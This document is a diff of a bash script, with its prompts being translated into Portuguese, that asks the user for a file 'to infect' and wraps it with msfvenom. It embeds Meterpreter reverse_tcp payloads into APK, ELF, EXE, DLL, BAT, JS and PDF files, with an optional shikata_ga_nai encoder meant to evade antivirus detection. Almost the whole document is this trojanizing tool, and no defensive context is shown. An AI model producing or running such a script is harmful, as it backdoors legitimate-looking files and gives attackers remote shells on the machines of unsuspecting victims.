@@ -18,8 +18,7 @@ install_apktool() {
     if command -v apktool &> /dev/null; then
       echo "apktool instalado com sucesso."
     else
-      echo "Falha ao instalar o apktool."
-      exit 1
+      echo "Falha ao instalar o apktool. Continuando sem ele..."
     fi
   else
     echo "apktool já está instalado."
@@ -30,7 +29,7 @@ install_apktool() {
 install_apktool
 
 # Prompt the user for the file path or name
-echo "Enter the path or name of the file you want to infect (e.g. /path/to/file or file):"
+echo "Digite o caminho ou nome do arquivo que você deseja infectar (por exemplo, /path/to/file ou file):"
 read file
 
 # Check if the user provided a path or just a file name
@@ -43,22 +42,33 @@ fi
 # Detect the file extension
 ext="${file_path##*.}"
 
-# Use MSFVenom to create the reverse shell payload with an encoder
-if [[ $ext == "apk" ]]; then
-  msfvenom -a android -x $file_path -e x86/shikata_ga_nai -i 5 -platform android -p android/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -o infected_file.apk
-elif [[ $ext == "elf" ]]; then
-  msfvenom -a linux -x $file_path -e shikata_ga_nai -i 5 -platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f elf -o infected_file.elf
-elif [[ $ext == "pdf" ]]; then
-  msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -e x86/shikata_ga_nai -f pdf -o infected_file.pdf
-elif [[ $ext == "exe" ]]; then
-  msfvenom -a x86 --platform Windows -x $file_path -e x86/shikata_ga_nai -i 5 -platform windows -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f exe -o infected_file.exe
-elif [[ $ext == "dll" ]]; then
-  msfvenom -a x86 --platform Windows -x $file_path -e x86/shikata_ga_nai -i 5 -platform windows -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f dll -o infected_file.dll
-elif [[ $ext == "bat" ]]; then
-  msfvenom -a x86 --platform Windows -x $file_path -e x86/shikata_ga_nai -i 5 -platform windows -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f bat -o infected_file.bat
-elif [[ $ext == "js" ]]; then
-  msfvenom -a x86 --platform Windows -x $file_path -e x86/shikata_ga_nai -i 5 -platform windows -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f js -o infected_file.js
+# Perguntar se o usuário deseja usar um encoder
+echo "Deseja usar um encoder? (s/n)"
+read use_encoder
+
+# Define o encoder se o usuário escolher "s"
+if [[ $use_encoder == "s" ]]; then
+  encoder="-e x86/shikata_ga_nai -i 5"
 else
-  echo "Unsupported file extension: $ext"
+  encoder=""
+fi
+
+# Use MSFVenom to create the reverse shell payload with or without an encoder
+if [[ $ext == "apk" ]]; then
+  msfvenom -a android -x $file_path $encoder -platform android -p android/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -o infected_file.apk
+elif [[ $ext == "elf" ]]; then
+  msfvenom -a linux -x $file_path $encoder -platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f elf -o infected_file.elf
+elif [[ $ext == "pdf" ]]; then
+  msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> $encoder -f pdf -o infected_file.pdf
+elif [[ $ext == "exe" ]]; then
+  msfvenom -a x86 --platform Windows -x $file_path $encoder -platform windows -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f exe -o infected_file.exe
+elif [[ $ext == "dll" ]]; then
+  msfvenom -a x86 --platform Windows -x $file_path $encoder -platform windows -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f dll -o infected_file.dll
+elif [[ $ext == "bat" ]]; then
+  msfvenom -a x86 --platform Windows -x $file_path $encoder -platform windows -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f bat -o infected_file.bat
+elif [[ $ext == "js" ]]; then
+  msfvenom -a x86 --platform Windows -x $file_path $encoder -platform windows -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f js -o infected_file.js
+else
+  echo "Extensão de arquivo não suportada: $ext"
   exit 1
 fi
